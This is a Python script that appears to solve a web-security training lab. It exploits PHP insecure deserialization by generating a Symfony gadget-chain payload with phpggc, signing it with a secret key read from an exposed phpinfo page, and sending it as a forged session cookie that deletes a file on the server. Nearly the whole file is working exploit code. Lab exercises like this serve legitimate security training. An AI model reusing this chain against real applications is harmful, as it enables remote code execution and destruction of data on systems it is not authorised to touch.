import base64
import http.client
import os.path
import ssl
import subprocess
import time
import urllib.parse
from hashlib import sha1
import hmac

LAB_ID = "???"


def GET_(session: str) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}'
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


file_to_delete = '/home/carlos/morale.txt'
payload = "symfony/rce7"

if not os.path.isdir("phpggc"):
    subprocess.check_output(['git', 'clone', 'git@github.com:ambionics/phpggc.git'])
    time.sleep(1)
generated_payload = subprocess.check_output(['./phpggc/phpggc', payload, 'unlink', file_to_delete]).decode('utf-8')
print(f"generated payload: {generated_payload}")
encoded_payload = base64.b64encode(generated_payload.replace('\n', '').encode('utf-8'))
print(f"encoded payload: {encoded_payload}")

key = input("get server['secret_key'] from /cgi-bin/phpinfo.php: ").encode('utf-8')
print(f"key: {key}")
signature = hmac.new(key, encoded_payload, sha1).hexdigest()
print(f"signature: {signature}")

session = f"""{{"token":"{encoded_payload.decode('utf-8')}","sig_hmac_sha1":"{signature}"}}"""
print(f"session: {session}")
encoded_session = urllib.parse.quote(session)
print(f"encoded session: {encoded_session}")

response = GET_(session=encoded_session)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
time.sleep(1)
